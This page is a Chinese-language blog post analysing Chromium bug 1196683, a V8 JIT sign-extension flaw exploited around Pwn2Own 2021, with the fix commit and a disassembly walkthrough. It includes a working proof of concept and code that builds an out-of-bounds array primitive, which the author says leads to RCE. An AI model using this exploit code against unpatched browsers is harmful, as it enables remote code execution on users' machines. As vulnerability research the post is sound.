<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="昨天4月13日Rajvardhan Agarwal公开了一个chrome renderer的0day exp，貌似这个0day就是前几天pwn2own 上_niklasb和bkth_打穿chrome用的renderer RCE。"><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/highlight.css"><link rel="stylesheet" type="text/css" href="/css/noise.css"><title>chromium1196683 | /home/5n1p3r0010</title><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Hexo 5.4.0"></head><body><article class="wrapper"><div class="post-main"><div class="nav"><nav class="container"><a class="sidebar-nav-item active" href="/">Home</a><a class="sidebar-nav-item" href="/archives">Archives</a></nav><div class="container post-meta"><div class="post-tags"><a class="post-tag-none-link" href="/tags/Browser/" rel="tag">Browser</a></div><div class="post-time">2021-04-14</div></div></div><div class="container post-header"><h1>chromium1196683</h1></div><div class="container post-toc"><details class="toc"><summary class="toc-accordion">Table of Contents</summary><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol></details></div><div class="container post-content"><p>昨天4月13日Rajvardhan Agarwal公开了一个chrome renderer的0day exp，貌似这个0day就是前几天pwn2own 上_niklasb和bkth_打穿chrome用的renderer RCE。</p>
<p>​漏洞在v8里修复的commit是</p>
<p><a target="_blank" rel="noopener" href="https://github.com/v8/v8/commit/02f84c745fc0cae5927a66dc4a3e81334e8f60a6#diff-0bd8b88770d3fe0b131f9979e595c813be5d97f0aad10f4a78c40ba488c56b39">https://github.com/v8/v8/commit/02f84c745fc0cae5927a66dc4a3e81334e8f60a6#diff-0bd8b88770d3fe0b131f9979e595c813be5d97f0aad10f4a78c40ba488c56b39</a></p>
<p>，可以看到这个commit是4月12日刚提交的。所以这应该也是Rajvardhan Agarwal说的为什么v8最新版已经修复了但是chrome还能触发的原因;p</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>​    提取出poc如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const arr &#x3D; new Uint32Array([2**31]);</span><br><span class="line">function foo() &#123;</span><br><span class="line">    return (arr[0] ^ 0) + 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a &#x3D; foo();</span><br><span class="line">print(a);</span><br><span class="line"></span><br><span class="line">for(var i&#x3D;0;i&lt;0x3000;++i)</span><br><span class="line">    foo(true);</span><br><span class="line"></span><br><span class="line">var b &#x3D; foo(false);</span><br><span class="line">print(b);</span><br></pre></td></tr></table></figure>

<p>运行d8 –allow-natives-syntax poc.js，可以看到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-2147483647</span><br><span class="line">2147483649</span><br></pre></td></tr></table></figure>

<p>-pow(2,31)+1=-2147483647。jit优化前运行结果-2147483647=0xFFFFFFFF80000001，jit优化后运行结果2147483649=0x80000001。</p>
<p>​    通过修复的commit可以发现，这里只改了一行代码就是在操作数是Word32时不管是否是有符号类型jit生成的汇编码均为Movsxlq。Movsxlq命令将操作数的第[31]位即32位数的符号位复制到64位寄存器的高32位，即</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dst[63:32] &#x3D; src[31]</span><br><span class="line">dst[31:0] &#x3D; src[31:0]</span><br></pre></td></tr></table></figure>

<p><img src="image-20210413143647448.png" alt="image-20210413143647448"></p>
<p>  而修复前对无符号数Uint32会使用汇编码Movl，如poc中的<code>new Uint32Array([2**31]);</code>，这样就会导致jit优化后的代码操作数出现typer错误。</p>
<p>​    使用d8 –print-opt-code //poc.js可以看到jit优化生成的汇编码。截取部分汇编码如下，其中rcx保存arr对象，0x443000840a3做arr的加法操作，0x443000840b5将加法操作结果使用movl将加法结果rdi保存到rcx准备返回，可以看到补丁前正是这里的movl消除了加法结果rdi的符号位。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x44300084096    56  48b95585140843040000 REX.W movq rcx,0x44308148555    ;; object: 0x044308148555 &lt;Uint32Array map &#x3D; 0x44308303105&gt;</span><br><span class="line">0x443000840a0    60  8b792f         movl rdi,[rcx+0x2f]</span><br><span class="line">0x443000840a3    63  4903fd         REX.W addq rdi,r13</span><br><span class="line">0x443000840a6    66  4c8b4127       REX.W movq r8,[rcx+0x27]</span><br><span class="line">0x443000840aa    6a  4883791f00     REX.W cmpq [rcx+0x1f],0x0</span><br><span class="line">0x443000840af    6f  0f864b010000   jna 0x44300084200  &lt;+0x1c0&gt;</span><br><span class="line">0x443000840b5    75  8bcf           movl rcx,rdi</span><br></pre></td></tr></table></figure>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>​    由于jit优化前-pow(2,31)+1实际计算结果应为-2147483647，经过jit优化后jit compiler认为计算结果为2147483649。我们可以利用这两者的差异构造一个OOB array。</p>
<p>​    Rajvardhan Agarwal的方法是取优化后x的绝对值与2147483647的差和0的较大值，这样优化前[1]处x的值为0；优化后2147483649截取pow(2,31)有效位结果为1，[1]处计算结果x为1，导致[2]处实际为new Array(0)，经过arr.shift()操作arr.length-1后arr实际长度为4294967295=0xFFFFFFFF。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">x &#x3D; Math.abs(x);</span><br><span class="line">x -&#x3D; 2147483647;</span><br><span class="line">x &#x3D; Math.max(x, 0);		&#x2F;&#x2F;[1]</span><br><span class="line"></span><br><span class="line">x -&#x3D; 1;</span><br><span class="line">if(x&#x3D;&#x3D;-1) </span><br><span class="line">&#123;</span><br><span class="line">  x &#x3D; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var arr &#x3D; new Array(x);	&#x2F;&#x2F;[2]</span><br><span class="line">arr.shift();</span><br><span class="line">var cor &#x3D; [1.1, 1.2, 1.3];</span><br><span class="line"></span><br><span class="line">return [arr, cor];</span><br></pre></td></tr></table></figure>

<p>可以从release编译的v8中看到这一结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">const _arr &#x3D; new Uint32Array([2**31]);</span><br><span class="line"></span><br><span class="line">function foo(a) &#123;</span><br><span class="line">    var x &#x3D; 1;</span><br><span class="line">	x &#x3D; (_arr[0] ^ 0) + 1;</span><br><span class="line"></span><br><span class="line">	x &#x3D; Math.abs(x);</span><br><span class="line">	x -&#x3D; 2147483647;</span><br><span class="line">	x &#x3D; Math.max(x, 0);</span><br><span class="line"></span><br><span class="line">	x -&#x3D; 1;</span><br><span class="line">	if(x&#x3D;&#x3D;-1) x &#x3D; 0;</span><br><span class="line"></span><br><span class="line">	var arr &#x3D; new Array(x);</span><br><span class="line">	arr.shift();</span><br><span class="line">	var cor &#x3D; [1.1, 1.2, 1.3];</span><br><span class="line"></span><br><span class="line">	return [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i&#x3D;0;i&lt;0x3000;++i)</span><br><span class="line">    foo(true);</span><br><span class="line"></span><br><span class="line">var x &#x3D; foo(false);</span><br><span class="line">%DebugPrint(x[0]);</span><br></pre></td></tr></table></figure>

<p>运行得到类似如下结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x102e0834f905 &lt;JSArray[4294967295]&gt;</span><br></pre></td></tr></table></figure>

<p>​    有了这样一个OOB array就可以RCE了;p。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​    从poc来看这个漏洞可能是通过代码审计的方式挖到的，看来无论从学习c++的角度还是挖洞的角度/src/compiler中的代码都还值得一看。</p>
</div></div><div class="post-main post-comment"></div></article><link rel="stylesheet" type="text/css" href="/css/font.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
  $(".fancybox").fancybox();
});
</script></body></html>